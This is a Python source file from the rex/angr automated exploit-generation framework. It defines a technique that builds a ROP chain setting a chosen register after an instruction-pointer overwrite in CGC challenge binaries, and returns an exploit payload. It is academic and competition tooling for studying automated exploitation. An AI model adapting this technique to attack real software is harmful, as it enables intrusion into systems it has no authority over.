import angr
import logging
from rex import Vulnerability
from rex.exploit import Payload, CannotExploit
from ..technique import Technique

l = logging.getLogger("rex.exploit.techniques.cgc.rop_set_register")

class RopSetRegister(Technique):

    name = "rop_set_register"

    applicable_to = ['cgc']

    def apply(self, register, **kwargs):
        #pylint:disable=arguments-differ

        ct = self.crash.crash_type
        if ct == Vulnerability.IP_OVERWRITE or ct == Vulnerability.PARTIAL_IP_OVERWRITE:
            try:
                # get a chain with a dummy value
                chain = self.rop.set_regs(**{register: 0x41414141})
            except angr.analyses.rop.RopException:
                raise CannotExploit("[%s] no rop chains which set the registers %s" % (self.name, register))

            _, chain_addr, _ = self._ip_overwrite_with_chain(chain)

            # place the chain onto chain_addr
            chain_mem = self.crash.state.memory.load(chain_addr, len(chain.payload_str()))
            chain_bvv = self.crash.state.BVV(chain.payload_str())
            self.crash.state.add_constraints(chain_mem == chain_bvv)

            return Payload(self.crash, self.crash.state)
